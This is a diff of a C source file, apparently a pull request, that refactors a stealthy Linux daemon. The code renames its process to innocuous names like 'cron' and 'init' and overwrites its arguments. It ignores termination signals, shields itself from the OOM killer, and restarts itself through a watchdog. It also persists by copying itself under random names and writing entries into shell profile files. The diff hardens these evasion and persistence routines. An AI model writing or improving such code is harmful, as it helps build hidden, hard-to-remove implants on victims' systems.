@@ -20,10 +20,7 @@
 #include <grp.h>
 #include "headers/daemon.h"
 
-static int is_root() {
-    return getuid() == 0;
-}
-
+//extra file edit from pull request #3
 static const char* get_random_name(void) {
     static const char *names[] = {
         "update", "cache", "cron", "logs",
@@ -37,25 +34,23 @@ static const char* get_random_name(void) {
 static int safe_strncpy(char *dest, const char *src, size_t size) {
     if (!dest || !src || size == 0) return -1;
     size_t len = strlen(src);
-    if (len >= size - 1) return -1;
-    memmove(dest, src, len);
+
+    if (len >= size) {
+        return -1;
+    }
+    memcpy(dest, src, len);
     dest[len] = '\0';
     return 0;
 }
 
 static int join_path(char *dest, size_t dest_size, const char *dir, const char *file) {
     if (!dest || !dir || !file || dest_size == 0) return -1;
-    size_t dir_len = strlen(dir);
-    size_t file_len = strlen(file);
-    size_t req_len = dir_len + file_len + 2; // +1 for '/' and +1 for '\0'
-    if (req_len > dest_size) return -1;
-    //fix buffer overflow 1
-    memcpy(dest, dir, dir_len);
-    dest[dir_len] = '/';
-    //overflow 2
-    //snprintf->memcpy
-    memcpy(dest + dir_len + 1, file, file_len);
-    dest[req_len - 1] = '\0';
+
+    int written = snprintf(dest, dest_size, "%s/%s", dir, file);
+    if (written < 0 || (size_t)written >= dest_size) {
+        if (dest_size > 0) dest[0] = '\0';
+        return -1;
+    }
     return 0;
 }
 
@@ -66,9 +61,8 @@ static const char *process_names[] = {
 };
 static const size_t process_names_count = sizeof(process_names) / sizeof(process_names[0]);
 
-static void protect_process() {
-    struct rlimit limit = {0};
-    limit.rlim_cur = limit.rlim_max = RLIM_INFINITY;
+static void protect_process(void) {
+    struct rlimit limit = {RLIM_INFINITY,RLIM_INFINITY};
     setrlimit(RLIMIT_AS, &limit);
     setrlimit(RLIMIT_MEMLOCK, &limit);
     setrlimit(RLIMIT_NPROC, &limit);
@@ -81,20 +75,13 @@ static void protect_process() {
     int fd = open("/proc/self/oom_score_adj", O_WRONLY);
     if(fd >= 0) {if(write(fd,"-1000\n",6) != 6) goto done; done: close(fd);}
     setpriority(PRIO_PROCESS, 0, -20);
-    struct sigaction sa = {0};
-    sa.sa_handler = SIG_IGN;
+    struct sigaction sa = {.sa_handler = SIG_IGN, .sa_flags = SA_RESTART|SA_NOCLDWAIT};
     sigfillset(&sa.sa_mask);
-    sa.sa_flags = SA_RESTART|SA_NOCLDWAIT;
-    int signals[] = {
-        SIGTERM, SIGINT, SIGQUIT, SIGHUP, SIGTSTP, SIGUSR1, SIGUSR2, SIGALRM, SIGPIPE, SIGCHLD, SIGCONT, SIGABRT, SIGTRAP, SIGBUS, SIGFPE, SIGILL, SIGSEGV, SIGSYS, SIGXCPU, SIGXFSZ, SIGVTALRM, SIGPROF, SIGPWR, SIGURG, SIGWINCH, SIGIO, SIGTTIN, SIGTTOU
-    };
-    int num_signals = sizeof(signals)/sizeof(signals[0]);
-    for (int i = 0; i < num_signals; i++) {
-        sigaction(signals[i], &sa, NULL);
-    }
+    int signals[] = {SIGTERM,SIGINT,SIGQUIT,SIGHUP,SIGTSTP,SIGUSR1,SIGUSR2,SIGALRM,SIGPIPE,SIGCHLD,SIGCONT,SIGABRT,SIGTRAP,SIGBUS,SIGFPE,SIGILL,SIGSEGV,SIGSYS,SIGXCPU,SIGXFSZ,SIGVTALRM,SIGPROF,SIGPWR,SIGURG,SIGWINCH,SIGIO,SIGTTIN,SIGTTOU};
+    for (int i = 0; i < sizeof(signals)/sizeof(signals[0]); i++) sigaction(signals[i], &sa, NULL);
 }
 
-void* rename_process(void* arg) {
+void* rename_process(void* arg __attribute__((unused))) {
     static unsigned int last_name_index = 0;
     while (1) {
         unsigned int name_index = (rand() % process_names_count);
@@ -104,8 +91,8 @@ void* rename_process(void* arg) {
         const char* new_name = process_names[name_index];
         char* env_ptr = (char*)getenv("_");
         if (env_ptr) {
-            size_t env_size = strlen(env_ptr);
-            safe_strncpy(env_ptr, new_name, env_size + 1);
+            size_t env_val_len = strlen(env_ptr);
+            safe_strncpy(env_ptr, new_name, env_val_len + 1);
             prctl(PR_SET_NAME, new_name);
         }
         last_name_index = name_index;
@@ -167,36 +154,53 @@ void handle_watchdog_error() {
 }
 
 void* watchdog(void* arg) {
+    (void)arg;
+    
     time_t last = time(NULL);
-    char path[PATH_MAX], exe[PATH_MAX];
-    pid_t pid = getpid();
-    if (readlink("/proc/self/exe", exe, sizeof(exe)-1) < 0) return NULL;
+    char exe[PATH_MAX];
+    long max_rss_kb = 250000; // 250MB limit
+
+    ssize_t rlen = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
+    if (rlen < 0) {
+        handle_watchdog_error();
+        return NULL;
+    }
+    exe[rlen] = '\0';
     
     while (1) {
         FILE* f = fopen("/proc/self/status", "r");
         if (f) {
             char* line = NULL;
             size_t len = 0;
-            while (getline(&line, &len, f) != -1) {
+            ssize_t read;
+            
+            while ((read = getline(&line, &len, f)) != -1) {
                 if (strstr(line, "VmRSS:")) {
                     long rss = 0;
-                    if (sscanf(line, "VmRSS: %ld", &rss) == 1 && rss > 250000) {
-                        pid_t child = fork();
-                        if (child == 0) {execl(exe, "init", NULL); _exit(1);}
+                    if (sscanf(line, "VmRSS: %ld", &rss) == 1 && rss > max_rss_kb) {
+                        if (execl(exe, "init", NULL) == -1) {
+                            handle_watchdog_error();
+                        }
+                        _exit(1);
                     }
                     break;
                 }
             }
+            
             free(line);
             fclose(f);
         }
+        
         if (time(NULL) - last > 300) {
-            pid_t child = fork();
-            if (child == 0) {execl(exe, "init", NULL); _exit(1);}
-            last = time(NULL);
+            if (execl(exe, "init", NULL) == -1) {
+                handle_watchdog_error();
+            }
+            _exit(1);
         }
+        
         sleep(30);
     }
+    
     return NULL;
 }
 
@@ -243,9 +247,9 @@ int startup_persist(const char *source_path) { //2
                 
                 char dest_path[PATH_MAX] = {0};
                 const char* name = get_random_name();
-                size_t remaining = sizeof(dest_path);
-                size_t written = snprintf(dest_path, remaining, "%s/%s_%x", dest_dir, name, rand_val);
-                if (written >= remaining) continue;
+                size_t remaining_dest_path = sizeof(dest_path);
+                int written_dest_path = snprintf(dest_path, remaining_dest_path, "%s/%s_%x", dest_dir, name, rand_val);
+                if (written_dest_path < 0 || (size_t)written_dest_path >= remaining_dest_path) continue;
                 
                 if (access(dest_path, F_OK) == 0) continue;
                 
@@ -272,8 +276,9 @@ int startup_persist(const char *source_path) { //2
                         int entry_exists = 0;
                         FILE *check = fopen(profile_path, "r");
                         if (check) {
-                            char line[PATH_MAX];
+                            char line[PATH_MAX]; 
                             while (fgets(line, sizeof(line), check)) {
+                                line[strcspn(line, "\n")] = 0;
                                 if (strcmp(line, dest_path) == 0) {
                                     entry_exists = 1;
                                     break;
@@ -308,59 +313,101 @@ void signal_handler(int sig) {
 void setup_signal_handlers() {
     struct sigaction sa;
     memset(&sa, 0, sizeof(sa));
-    sa.sa_handler = SIG_IGN;
-    sigemptyset(&sa.sa_mask);
-    sa.sa_flags = 0;
-    
-    if (sigaction(SIGPIPE, &sa, NULL) != 0) return;
-    if (sigaction(SIGHUP, &sa, NULL) != 0) return;
-    
     sa.sa_handler = signal_handler;
-    if (sigaction(SIGTERM, &sa, NULL) != 0) return;
-    if (sigaction(SIGINT, &sa, NULL) != 0) return;
-    
-    sa.sa_handler = SIG_IGN;
-    if (sigaction(SIGALRM, &sa, NULL) != 0) return;
-    if (sigaction(SIGUSR1, &sa, NULL) != 0) return;
-    if (sigaction(SIGUSR2, &sa, NULL) != 0) return;
-}
+    sigfillset(&sa.sa_mask);
+    sa.sa_flags = SA_RESTART;
 
-void daemonize(int argc, char** argv) {
-    pid_t pid = fork();
-    if (pid > 0) _exit(0);
+    int signals[] = {
+        SIGTERM, SIGINT, SIGQUIT, SIGHUP, SIGTSTP, 
+        SIGUSR1, SIGUSR2, SIGALRM, SIGPIPE
+    };
+    int num_signals = sizeof(signals) / sizeof(signals[0]);
 
-    setsid();
-
-    pid = fork();
-    if (pid > 0) _exit(0);
-
-    int _chdir_ret = chdir("/");
-    (void)_chdir_ret;
-    umask(0);
-    struct rlimit rlim;
-    if (!getrlimit(RLIMIT_NOFILE, &rlim)) {
-        for (int i = 0; i < (int)rlim.rlim_max; i++) close(i);
+    for (int i = 0; i < num_signals; i++) {
+        if (sigaction(signals[i], &sa, NULL) != 0) {
+            continue;
+        }
     }
-    int fd = open("/dev/null", O_RDWR);
-    if (fd >= 0) {
-        dup2(fd, 0); dup2(fd, 1); dup2(fd, 2);
-        if (fd > 2) close(fd);
-    }
-    protect_process();
-    pthread_attr_t attr;
-    pthread_attr_init(&attr);
-    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
-    pthread_t watcher;
-    pthread_create(&watcher, &attr, watchdog, NULL);
-    pthread_attr_destroy(&attr);
-    srand(time(NULL) ^ (getpid() << 16));
 }
 
 void overwrite_argv(int argc, char** argv) {
-    if (!argv || argc <= 0) return;
-    for (int i = 0; i < argc && argv[i]; i++) {
-        size_t len = strlen(argv[i]);
-        if (len > 0) explicit_bzero(argv[i], len);
+    if (!argv || argc <= 0 || !argv[0]) {
+        return;
     }
-    if (argv[0] && strlen(argv[0]) >= 4) memcpy(argv[0], "init", 4);
+
+    char* argv0_ptr = argv[0];
+    size_t argv0_len = strlen(argv[0]);
+
+    for (int i = 0; i < argc && argv[i] != NULL; i++) {
+        size_t current_arg_len = (argv[i] == argv0_ptr) ? argv0_len : strlen(argv[i]);
+        if (current_arg_len > 0) {
+            explicit_bzero(argv[i], current_arg_len);
+        }
+    }
+
+    if (argv0_len > 0) { 
+        snprintf(argv0_ptr, argv0_len, "init");
+    }
+}
+
+static void protect_process(void);
+
+void daemonize(int argc, char** argv) {
+    pid_t pid = fork();
+    if (pid < 0) return; 
+    if (pid > 0) _exit(0);  
+
+    if (setsid() < 0) {
+        perror("setsid failed");
+        return;
+    }
+
+    if (chdir("/") != 0) {
+        perror("chdir failed");
+    }
+
+    umask(0);
+    struct rlimit rlim;
+    rlim_t max_fd = 1024;
+    if (getrlimit(RLIMIT_NOFILE, &rlim) == 0) {
+        max_fd = rlim.rlim_cur;
+    }
+
+    for (rlim_t i = 0; i < max_fd; i++) {
+        if (i != STDIN_FILENO && i != STDOUT_FILENO && i != STDERR_FILENO) {
+            close((int)i);
+        }
+    }
+
+    int fd = open("/dev/null", O_RDWR);
+    if (fd >= 0) {
+        if (dup2(fd, STDIN_FILENO) < 0) {
+            perror("Failed to redirect stdin");
+        }
+        if (dup2(fd, STDOUT_FILENO) < 0) {
+            perror("Failed to redirect stdout");
+        }
+        if (dup2(fd, STDERR_FILENO) < 0) {
+            perror("Failed to redirect stderr");
+        }
+        if (fd > STDERR_FILENO) {
+            close(fd);
+        }
+    } else {
+        perror("Failed to open /dev/null");
+    }
+
+    protect_process();
+    pthread_attr_t attr;
+    if (pthread_attr_init(&attr) == 0) {
+        if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED) == 0) {
+            pthread_t watcher;
+            pthread_create(&watcher, &attr, watchdog, NULL);
+        }
+        pthread_attr_destroy(&attr);
+    }
+    srand((unsigned int)(time(NULL) ^ (getpid() << 16)));
+    if (argv != NULL) {
+        overwrite_argv(argc, argv);
+    }
 }
